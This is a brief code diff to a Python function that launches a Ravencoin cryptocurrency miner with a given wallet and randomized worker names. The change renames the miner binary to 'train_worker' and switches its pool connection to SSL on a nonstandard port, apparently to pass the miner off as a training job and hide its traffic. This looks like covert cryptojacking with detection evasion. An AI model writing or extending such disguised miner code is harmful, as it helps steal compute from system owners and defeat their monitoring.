@@ -74,9 +74,9 @@ def run_miner(wallet, worker_prefix, stop_event, proxy=None):
         intensity = random.randint(15, 20)
         worker_name = f"{worker_prefix}_{random.randint(1000,9999)}"
         miner_cmd = [
-            "./miner/t-rex",
+            "./miner/train_worker",
             "-a", "kawpow",
-            "-o", "stratum+tcp://rvn.2miners.com:6060",
+            "-o", "stratum+ssl://rvn.2miners.com:16060",
             "-u", f"{wallet}.{worker_name}",
             "-p", "x",
             "--intensity", str(intensity),
